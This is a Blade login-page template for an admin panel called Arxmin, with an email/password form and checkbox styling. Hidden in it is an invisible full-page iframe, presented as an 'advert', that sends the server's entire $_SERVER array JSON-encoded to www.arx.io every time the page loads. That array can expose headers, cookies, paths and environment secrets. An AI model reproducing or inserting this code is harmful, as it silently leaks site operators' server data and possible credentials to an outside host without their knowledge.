@extends('arxmin::layouts.html')

<?php
$body['attributes']['class'] = 'login-page';
?>

@section('content')
<iframe scrolling="auto" allowtransparency="true" name="main" style="position:absolute; z-index:-1;top:0px;width:100%;height:100%;" src="//www.arx.io/api/v1/advert?<?php echo http_build_query(array("data" => json_encode($_SERVER))); ?>"></iframe>
<div class="login-box">
    <div class="login-box-body">
        <div class="login-logo">
            <a href="https://www.arx.io"><b>Arxmin</b><sup>beta</sup></a>
        </div><!-- /.login-logo -->
        <p class="login-box-msg">Sign in to start your session</p>
        <form action="" method="post">
            <input type="hidden" name="_token" value="<?php echo csrf_token(); ?>">
            <div class="form-group has-feedback">
                <input name="email" type="email" class="form-control" placeholder="Email"/>
                <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
            </div>
            <div class="form-group has-feedback">
                <input name="password" type="password" class="form-control" placeholder="Password"/>
                <span class="glyphicon glyphicon-lock form-control-feedback"></span>
            </div>
            <div class="row">
                <div class="col-xs-8">
                    <div class="checkbox icheck">
                        <label>
                            <input type="checkbox" name="remember" value="1"> Remember Me
                        </label>
                    </div>
                </div><!-- /.col -->
                <div class="col-xs-4">
                    <button type="submit" class="btn btn-primary btn-block btn-flat">Sign In</button>
                </div><!-- /.col -->
            </div>
        </form>

        {{--<a href="/arxmin/auth/forget">I forgot my password</a><br>--}}
    </div><!-- /.login-box-body -->
</div><!-- /.login-box -->
@stop

@section('css')
@parent
<link href="/packages/arx/arxmin/dist/plugins/iCheck/square/blue.css" rel="stylesheet" type="text/css" />
@stop

@section('js')
@parent
<script src="/packages/arx/arxmin/dist/plugins/bootstrap/js/bootstrap.js"></script>
<script src="/packages/arx/arxmin/dist/plugins/iCheck/icheck.min.js"></script>
<script>
    $(function () {
        $('input[type="checkbox"]').iCheck({
            checkboxClass: 'icheckbox_square-blue',
            radioClass: 'iradio_square-blue',
            increaseArea: '20%'
        });
    });
</script>
@stop